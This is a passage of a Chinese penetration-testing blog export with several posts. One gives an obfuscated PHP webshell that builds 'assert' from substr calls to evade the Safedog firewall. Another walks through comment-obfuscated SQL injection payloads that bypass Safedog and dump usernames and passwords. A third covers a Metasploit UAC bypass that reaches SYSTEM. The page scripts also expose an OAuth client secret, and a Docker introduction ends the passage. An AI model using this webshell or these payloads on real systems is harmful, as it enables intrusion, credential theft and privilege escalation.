-<p>其实这个想法很早就有了，不过好像也有大佬有成品，不过我没看见过(可能是很久没接触渗透测试了)<br><br>于是今天晚上就试了一下<br><br>其实不管怎么绕过，一句话最终还是：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">assert($_POST[<span class="string">'x'</span>]);</div></pre></td></tr></table></figure></p>
-<p>所谓的绕过无非就是把这一段进行处理让他达到一个过waf的效果</p>
-<h1 id="Prat-2"><a href="#Prat-2" class="headerlink" title="Prat 2"></a>Prat 2</h1><h2 id="巧用substr函数绕过安全狗"><a href="#巧用substr函数绕过安全狗" class="headerlink" title="巧用substr函数绕过安全狗"></a>巧用substr函数绕过安全狗</h2><p>思路成品：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	 $a = substr(<span class="string">"abcdefghijklmnopqrstufwxyz"</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line">	 $b = substr(<span class="string">"abcdefghijklmnopqrstufwxyz"</span>,<span class="number">17</span>,<span class="number">3</span>);</div><div class="line">	 $c = substr(<span class="string">"abcdefghijklmnopqrstufwxyz"</span>,<span class="number">3</span>,<span class="number">2</span>);</div><div class="line">	 $ss = $a.$b.$c;</div><div class="line">	 $d  = $ss[<span class="number">0</span>].$ss[<span class="number">2</span>].$ss[<span class="number">2</span>]; <span class="comment">//ass</span></div><div class="line">	 $dd = $ss[<span class="number">5</span>].$ss[<span class="number">1</span>].$ss[<span class="number">3</span>]; <span class="comment">//ert</span></div><div class="line">	 $x = $d.$dd;</div><div class="line">$x($_POST[<span class="string">'x'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>这里主要关注这两行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$d  = $ss[<span class="number">0</span>].$ss[<span class="number">2</span>].$ss[<span class="number">2</span>]; <span class="comment">//ass</span></div><div class="line">$dd = $ss[<span class="number">5</span>].$ss[<span class="number">1</span>].$ss[<span class="number">3</span>]; <span class="comment">//ert</span></div><div class="line">$x = $d.$dd;</div></pre></td></tr></table></figure></p>
-<p>上面说了，一句话最终结果还是assert($_POST[‘x’]); 所以这里的$x肯定是assert<br>输出一下就知道。<br>如图：<br><img src="/img/2/shell_1.jpg" alt="image"><br>可以看见echo 出来了<strong>assert</strong><br>那么他是如何得到assert的呢，我们来看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$x = $d.$dd;</div></pre></td></tr></table></figure></p>
-<p>可以发现，<strong>$x</strong>通过<strong>$d</strong>跟<strong>$dd</strong>拼接得到的<br><br><strong>$d</strong>跟<strong>$dd</strong>是通过截取$ss的字符串得到的<br><br>我们分别来输出一下每一个变量获取到的字符串<br><img src="/img/2/shell_2.jpg" alt="image"><br>可以发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$a = a     //从字符串的第0个字符开始截取，向右截取1个字符</div><div class="line">$b = rst   //从字符串的第17个字符开始截取，向右截取3个字符</div><div class="line">$c = de	   //从字符串的第17个字符开始截取，向右截取3个字符</div><div class="line">$ss = arstde //为三个变量的拼接的来</div></pre></td></tr></table></figure></p>
-<p>那么整个过程就很好理解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$d = ass   //分别截取$ss的第0,2,2字符</div><div class="line">$dd = ert  //分别截取$ss的第5,1,3字符</div><div class="line">最后拼接成assert</div></pre></td></tr></table></figure></p>
-<p>看一下是否能过狗<br><img src="/img/2/shell_3.jpg" alt="image"><br>完美过狗，并没有拦截</p>
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-]]></content>
-      
-        <categories>
-            
-            <category> bypass </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> bypass </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Bypass_safedog系列2]]></title>
-      <url>/bypass_safedog.html</url>
-      <content type="html"><![CDATA[<p><img src="/img/safedog_bypass_1.jpg" alt="image"><br><a id="more"></a></p>
-<blockquote>
-<p>环境:php+mysql+apche<br><br>安全狗:apache版本+8.10规则库<br><br><a href="http://www.inksec.cn/" target="_blank" rel="external">即刻安全</a><br><br>即刻安全纯技术交流群：307283889<br><br>如需转载，请练习本博主声明，私自转载必追究</p>
-</blockquote>
-<h1 id="prat-1"><a href="#prat-1" class="headerlink" title="prat 1"></a>prat 1</h1><h2 id="本文大致内容"><a href="#本文大致内容" class="headerlink" title="本文大致内容"></a>本文大致内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">+ 思路以及想法</div><div class="line">	- 四重注释绕过safedog</div><div class="line">+ 实战绕过</div><div class="line">	- 绕过and 1=1</div><div class="line">	- 绕过union+select</div><div class="line">	- 爆表</div><div class="line">	- 爆字段</div><div class="line">	- 读内容</div></pre></td></tr></table></figure>
-<h1 id="prat-2"><a href="#prat-2" class="headerlink" title="prat 2"></a>prat 2</h1><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$link = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'security'</span>);</div><div class="line">$sql = <span class="string">"select * from users where id="</span>.$_GET[<span class="string">'id'</span>];</div><div class="line"></div><div class="line">$result = mysqli_query($link,$sql);</div><div class="line"><span class="keyword">if</span>($rows = mysqli_fetch_array($result))&#123;</div><div class="line">	<span class="keyword">echo</span> $rows[<span class="string">'id'</span>];</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> $rows[<span class="string">'username'</span>];</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> $rows[<span class="string">'password'</span>];</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">&#125;</div><div class="line">mysqli_close($link);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<h1 id="prat-3"><a href="#prat-3" class="headerlink" title="prat 3"></a>prat 3</h1><h2 id="绕过-and-1-1"><a href="#绕过-and-1-1" class="headerlink" title="绕过 and 1=1"></a>绕过 and 1=1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=1 and 1=1</div></pre></td></tr></table></figure>
-<p><img src="/img/safedog_bypass_1.jpg" alt="image"><br>发现惨遭拦截，首先让我们来看一下他拦截什么，不拦截什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">and        不拦截</div><div class="line">and 1      拦截</div><div class="line">and 1 =    拦截</div><div class="line">and 1 = 1  拦截</div></pre></td></tr></table></figure></p>
-<p>由此可见，只要and后面出现数字或者成立一个等式那么他就拦截，那我们用/**/注释来绕过一下看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/**/aNd/**//**/&apos;a&apos;/**/ = /**/&apos;a&apos;/**/</div></pre></td></tr></table></figure></p>
-<p>注释包含把1=1替换成<strong>‘a’ = ‘a’</strong>就得到了url:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.107/sql.php?id=1/**/aNd/**//**/&apos;a&apos;/**/=/**/&apos;b&apos;/**/</div></pre></td></tr></table></figure></p>
-<p><img src="/img/safedog_bypass_2.jpg" alt="image"><br>返回不正常(等式不等)并且发现狗就不拦截了，可见注释方法还是如此任性</p>
-<h2 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h2><p>我发现我装的狗是不会拦截order by的，所以也就没绕，有需求在说。<br><img src="/img/safedog_bypass_3.jpg" alt="image"><br>字段为3，接下来爆库，当前用户。</p>
-<h2 id="绕过union-select"><a href="#绕过union-select" class="headerlink" title="绕过union+select"></a>绕过union+select</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=1 UNION SELECT 1,2,3</div></pre></td></tr></table></figure>
-<p><img src="/img/safedog_bypass_4.jpg" alt="image"><br>同样，先看一下他拦截什么。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">union 不拦截</div><div class="line">select 不拦截</div><div class="line">union select 拦截</div></pre></td></tr></table></figure></p>
-<p>很明显，我们只需要在union与select之间处理一下就可以了。<br>首先使用/<em>!50000/注释包含/</em>!<em>/然后使用/**/与/</em>–*/打乱一下结构，在稍微进行一下编码处理就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,2,3)/*--*/*/-- -</div></pre></td></tr></table></figure></p>
-<p><img src="/img/safedog_bypass_5.jpg" alt="image"><br>可以发现，已经正常显示数字，并且狗没有拦截。   什么？你说没看懂？那么看下图<br><img src="/img/safedog_bypass_6.jpg" alt="image"><br>拆分一下就发现其实很好理解，使用()把select的内容包起来。</p>
-<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.107/sql.php?id=-1 /*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user(),database())/*--*/*/-- -</div></pre></td></tr></table></figure>
-<p><img src="/img/safedog_bypass_7.jpg" alt="image"><br>发现又特么拦截了，很明显，他会拦截一些常用系统函数(还有许多就不列出来了，列出常用的)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1. version()——MySQL 版本</div><div class="line">2. user()——数据库用户名</div><div class="line">3. database()——数据库名</div><div class="line">4. @@datadir——数据库路径</div><div class="line">5. @@version_compile_os——操作系统版本</div></pre></td></tr></table></figure></p>
-<p>既然已经知道了拦截什么，那么绕他还难么，掏出/**/注释大法。<br>在user(),database()之间处理以下。<br>那么就成为了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user/**/(/**/)</div><div class="line">database/**/(/**/)</div><div class="line">完整url：http://192.168.1.107/sql.php?id=-1/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect 1,user/**/(/**/),database/**/(/**/))/*--*/*/-- -</div></pre></td></tr></table></figure></p>
-<p><img src="/img/safedog_bypass_8.jpg" alt="image"><br>正常爆出数据库跟当前用户</p>
-<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p>发现我本身的狗可能有点问题，他不拦截from，于是也没有绕，还是那句话，需要啥，绕啥。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1</div><div class="line">/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,table_name)),user/**/(/**/)</div><div class="line">from information_schema.tables where table_schema=&apos;security&apos;)/*--*/*/ limit 0,1-- -</div></pre></td></tr></table></figure></p>
-<p><img src="/img/safedog_bypass_9.jpg" alt="image"><br><strong>得到table</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">emails</div><div class="line">referers</div><div class="line">uagents</div><div class="line">users</div></pre></td></tr></table></figure></p>
-<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1</div><div class="line">/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,column_name)),user/**/(/**/)</div><div class="line">from information_schema.columns where table_name=&apos;users&apos;)/*--*/*/ limit 0,1-- -</div></pre></td></tr></table></figure>
-<p><img src="/img/safedog_bypass_10.jpg" alt="image"><br><strong>得到column</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">id</div><div class="line">username</div><div class="line">password</div></pre></td></tr></table></figure></p>
-<h2 id="读内容"><a href="#读内容" class="headerlink" title="读内容"></a>读内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url:http://192.168.1.107/sql.php?id=-1</div><div class="line">/*!50000/*--*//**//*!%55nion/*--*/*//**//*!(%53elect database/**/(/**/),group_concat(concat_ws(0x23,username,password)),user/**/(/**/)</div><div class="line">from users)/*--*/*/ limit 0,1-- -</div></pre></td></tr></table></figure>
-<p><img src="/img/safedog_bypass_11.jpg" alt="image"><br><strong>dump</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Dumb#Dumb</div></pre></td></tr></table></figure></p>
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-]]></content>
-      
-        <categories>
-            
-            <category> bypass </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> bypass </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Bypassuac_Comhijack ---kali linux]]></title>
-      <url>/bypassuac-comhijack.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/2ADD67C458C4CF66997F4D366E247747.png" alt="enter description here"><br><a id="more"></a><br> 前天看了一个国外大牛的视频，觉得很有意思。就决定和你们分享一下<br> <a href="https://www.youtube.com/watch?v=HNRrmfuTRCY" target="_blank" rel="external">https://www.youtube.com/watch?v=HNRrmfuTRCY</a><br> <a href="https://securityonline.info/metasploit-add-com-class-id-hijack-method-bypassing-uac-windows-x86-x64-7810200820122016/" target="_blank" rel="external">https://securityonline.info/metasploit-add-com-class-id-hijack-method-bypassing-uac-windows-x86-x64-7810200820122016/</a></p>
-<h2 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h2><p>简称  用户帐户控制，  UAC  是Windows Vista中引入了通过防止程序的管理权限，除非批准的用户提供额外的安全功能。以下是用户在尝试运行程序或访问需要许可的Windows的一部分时可能看到的UAC确认对话框的图片。</p>
-<p> Metasploit模块<br> <a href="https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb" target="_blank" rel="external">https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb</a><br> <img src="http://ojg8j426f.bkt.clouddn.com/1502454208280.jpg" alt="enter description here"></p>
-<p> 该模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些高完整性流程时，将引用这些注册表项，从而导致加载用户控制的DLL的进程。这些DLL包含导致高级会话的有效载荷。有效负载调用后清除注册表项的修改。该模块需要有效负载的架构来匹配操作系统，但目前的低权限Meterpreter会话架构可能不同。如果在单独的进程中启动有效负载后指定EXE :: Custom，您的DLL应该调用ExitProcess（）。该模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，则此模块将无法正常运行。</p>
-<p> （以上引用大神文章）</p>
-<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
-<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
-<script>
-    var ivaInstance = new Iva('ivaLive', {
-        appkey: 'By9WGzBIx', //应用标示
-        video: 'http://oc78wb8cz.bkt.clouddn.com/bypassuac_comhijack.mp4', //视频
-        title: 'test', //视频标题，后台视频管理中的标题
-        cover: '' //视频封面，只有在autoplay:false才可生效
-    });
-</script>
-<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
-
-
-
-<p> 1.下载bypassuac_comhijack.rb<br> <pre><br> curl -o bypassuac_comhijack.rb <a href="https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb" target="_blank" rel="external">https://raw.githubusercontent.com/OJ/metasploit-framework/6ee5d83a157e7887c262ffa42b89ab061e7e8d8c/modules/exploits/windows/local/bypassuac_comhijack.rb</a><br> </pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502438764029.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>2.将下载的bypassuac_comhijack.rb 剪贴到msf 中<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502438764029.jpg" alt="enter description here"><br>&nbsp;</p>
-<ol>
-<li>需要的到一个Meterprerter的会话</li>
-</ol>
-<p>比如我这里使用我个人的脚本,第三个得到Meterprerter的会话。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454345346.jpg" alt="enter description here"><br>&nbsp;</p>
-<p><img src="http://ojg8j426f.bkt.clouddn.com/1502454478100.jpg" alt="enter description here"><br>&nbsp;</p>
-<p>3.使用bypassuac_comhijack<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454553056.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454631936.jpg" alt="enter description here"><br>&nbsp;<br>看到需要设置的是会话序列号，我这里设置 session 为 1，并且执行payload的时候，会报错，让我们看看需要更改的地方？<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454757164.jpg" alt="enter description here"><br>&nbsp;<br>因为目标虚拟机win10镜像本身是x64架构的，所以我们这里需要更改payload<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454854556.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454868195.jpg" alt="enter description here"><br>&nbsp;<br>并且更改端口<br><img src="http://ojg8j426f.bkt.clouddn.com/1502454885362.jpg" alt="enter description here"><br>&nbsp;<br>（PS:如果目标机是32位的话，不用更改PAYLOAD 只需更改端口即可）</p>
-<p>4.得到session 2<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502455024735.jpg" alt="enter description here"><br>&nbsp;<br>这里可以看到 我getuid的时候 是demon 用户<br>当我getsystem的时候 ，得到了system权限。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1502455140138.jpg" alt="enter description here"></p>
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-
-
-
-
-
-]]></content>
-      
-        <categories>
-            
-            <category> Metasploit </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> Metasploit </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[我的Docker不归路--重新认识docker]]></title>
-      <url>/%E6%88%91%E7%9A%84%E5%9B%9E%E5%BD%92docker.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/create-reusable-burner-os-with-docker-part-2-customizing-our-hacking-container.1280x600.jpg" alt="enter description here"><br><a id="more"></a></p>
-<h2 id="我的Docker不归路——-回归之作"><a href="#我的Docker不归路——-回归之作" class="headerlink" title="我的Docker不归路——(回归之作)"></a>我的Docker不归路——(回归之作)</h2><p>&nbsp;</p>
-<h2 id="0x01-docker-简介"><a href="#0x01-docker-简介" class="headerlink" title="0x01 docker 简介"></a>0x01 docker 简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>（这篇文章本是不打算公开的，写下这篇文章本是在四月份的，现在打算将其公开）前段时间写了一份Dcoker_kali，docker对我来说可以使用docker_kalil inux,也可以部署我们安全工作的靶机环境，如前段时间，在我的msf系列课程中就用到了，如何部署docker-s2-046的靶机环境。它对我来说应用不止这么一点，可以部署DVWA、WebGoat等渗透环境，可当做一个渗透演练平台。之前留了一部分坑在那，这次我打算好好的完善此Docker_kali使用内容。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491292493739.jpg" alt="enter description here"><br><img src="http://ojg8j426f.bkt.clouddn.com/202F1BA9-E832-467E-827D-A0084254460F.png" alt="enter description here"><br>&nbsp;<br><span style="color: #008000;">重新认识Docker </span><br>&nbsp;<br><strong><span style="color: #ffff99;"><br>&nbsp;&nbsp;Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的运行效率，降低了云计算资源供应的成本！ 使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！<br>无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，以在有限的时间内做更多有意义的事。</span></strong><br>&nbsp;<br>&nbsp;在安装前，先了解一些主要的概念<br>&nbsp;Docker 在Linux上安装过程里，你的物理机器既是本地主机也是Docker的宿主机。在网络里，本地主机的意思是你的计算机。Docker的宿主机是托管这容器运行的计算机。</p>
-<p>&nbsp;在一个标准的Linux安装中，Docker客户端、Docker Daemon和一些运行中的容器会直接寄托在你的本地主机上。这意味着你可以使用标准的本地地址和端口去访问容器<br>为什么要使用 Docker？</p>
-<p>&nbsp;作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。</p>
-<p><strong><span style="color: #ffff99;">更高效的利用系统资源</span></strong></p>
-<p>&nbsp;由于容器不需要进行硬件虚拟以及运行完整操作系统等额外开销，Docker 对系统资源的利用率更高。无论是应用执行速度、内存损耗或者文件存储速度，都要比传统虚拟机技术更高效。因此，相比虚拟机技术，一个相同配置的主机，往往可以运行更多数量的应用。</p>
-<p><strong><span style="color: #ffff99;">更快速的启动时间</span></strong></p>
-<p>&nbsp;传统的虚拟机技术启动应用服务往往需要数分钟，而 Docker 容器应用，由于直接运行于宿主内核，无需启动完整的操作系统，因此可以做到秒级、甚至毫秒级的启动时间。大大的节约了开发、测试、部署的时间。</p>
-<p><strong><span style="color: #ffff99;">一致的运行环境</span></strong></p>
-<p>&nbsp;开发过程中一个常见的问题是环境一致性问题。由于开发环境、测试环境、生产环境不一致，导致有些 bug 并未在开发过程中被发现。而 Docker 的镜像提供了除内核外完整的运行时环境，确保了应用运行环境一致性，从而不会再出现 “这段代码在我机器上没问题啊” 这类问题。</p>
-<p><strong><span style="color: #ffff99;">持续交付和部署</span></strong></p>
-<p>&nbsp;对开发和运维（DevOps）人员来说，最希望的就是一次创建或配置，可以在任意地方正常运行。</p>
-<p>&nbsp;使用 Docker 可以通过定制应用镜像来实现持续集成、持续交付、部署。开发人员可以通过 Dockerfile 来进行镜像构建，并结合 持续集成(Continuous Integration) 系统进行集成测试，而运维人员则可以直接在生产环境中快速部署该镜像，甚至结合 持续部署(Continuous Delivery/Deployment) 系统进行自动部署。</p>
-<p>&nbsp;而且使用 Dockerfile 使镜像构建透明化，不仅仅开发团队可以理解应用运行环境，也方便运维团队理解应用运行所需条件，帮助更好的生产环境中部署该镜像。</p>
-<p><strong><span style="color: #ffff99;">更轻松的迁移</span></strong></p>
-<p>&nbsp;由于 Docker 确保了执行环境的一致性，使得应用的迁移更加容易。Docker 可以在很多平台上运行，无论是物理机、虚拟机、公有云、私有云，甚至是笔记本，其运行结果是一致的。因此用户可以很轻易的将在一个平台上运行的应用，迁移到另一个平台上，而不用担心运行环境的变化导致应用无法正常运行的情况。</p>
-<p><strong><span style="color: #ffff99;">更轻松的维护和扩展</span></strong></p>
-<p>&nbsp;Docker 使用的分层存储以及镜像的技术，使得应用重复部分的复用更为容易，也使得应用的维护更新更加简单，基于基础镜像进一步扩展镜像也变得非常简单。此外，Docker 团队同各个开源项目团队一起维护了一大批高质量的官方镜像，既可以直接在生产环境使用，又可以作为基础进一步定制，大大的降低了应用服务的镜像制作成本。<br>&nbsp;<br>&nbsp;<br>参考资料:<a href="https://yeasy.gitbooks.io/docker_practice/content/introduction/why.html" target="_blank" rel="external">https://yeasy.gitbooks.io/docker_practice/content/introduction/why.html</a><br>&nbsp;<br>&nbsp;</p>
-<p><br></p>
-<h2 id="0x02windows-下安装docker"><a href="#0x02windows-下安装docker" class="headerlink" title="0x02windows 下安装docker"></a>0x02windows 下安装docker</h2><p>&nbsp;<br><span style="color: #ffff99;">Docker for Windows的安装与使用</span><br>&nbsp;&nbsp;&nbsp;在Windows 10中，下载Docker for Windows的安装包，然后开始安装。正如上面所述，如果Hyper-V没有启用，安装过程会自动启用Hyper-V，这将需要重新启动Windows系统。安装完成后，就可以在Windows下使用Docker了。<br><strong><span style="color: #ffff99;">在安装docker for windows 之后 不能安装vm、vbox等虚拟机，如需安装vbox、vm等虚拟机可采用下一个docker tools box 安装方法。</span></strong><br>&nbsp;</p>
-<p>&nbsp;启动Docker for Windows，会在系统托盘部分显示一条小鲸鱼的图标：<img src="http://ojg8j426f.bkt.clouddn.com/18AE48EA-DDC3-42A9-A3FB-EBF6DABAF159.png" alt="enter description here">。在Docker完全启动之前，小鲸鱼背上的小方块会不停地闪烁变化，等小方块稳定不变后，表示系统完全启动成功，此时就可以对Docker的环境进行设置，或者开始执行Docker命令了。<br>&nbsp;<br>&nbsp;<br>&nbsp;在Docker for Windows成功启动后，就可以在CMD下执行Docker命令了.<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/95A1080D-F7EC-49BA-8349-33E72A8CC427.png" alt="enter description here"><br>&nbsp;<br><span style="color: #ffff99;">Docker tools box的安装与使用</span></p>
-<p>&nbsp;因为Docker Engine守护程序使用特定于Linux的内核功能，因此无法在Windows上本机运行Docker Engine。相反，你必须使用docker命令 docker-machine，创建并连接到一个小型的Linux VM您的计算机上。该VM在Windows系统上为您托管Docker Engine。</p>
-<p>&nbsp;要运行Docker，您的计算机必须具有运行Windows 7或更高版本的64位操作系统。另外，您必须确保在您的计算机上启用虚拟化。<br><br></p>
-<p>0x001<br><img src="http://ojg8j426f.bkt.clouddn.com/11FD3728-44E9-4E2D-9786-AE2D3ECBF77B.png" alt="enter description here"><br>&nbsp;<br><br></p>
-<p>0x002<br>&nbsp;安装完会有VirtualBox/Docker Quickstart Terminal /kitematic (GUI图形化管理工具)<br>&nbsp;<br>&nbsp;&nbsp;<img src="http://ojg8j426f.bkt.clouddn.com/8D411BF4-40C8-4236-A585-478566FF0187.png" alt="enter description here"></p>
-<p><br></p>
-<p>0x003<br><span style="color: #ffff99;">启动Dcoker tools box 报错该解决？</span></p>
-<p><img src="http://ojg8j426f.bkt.clouddn.com/521CBD40926DEA268F4EEE8005297408.jpg" alt="enter description here"></p>
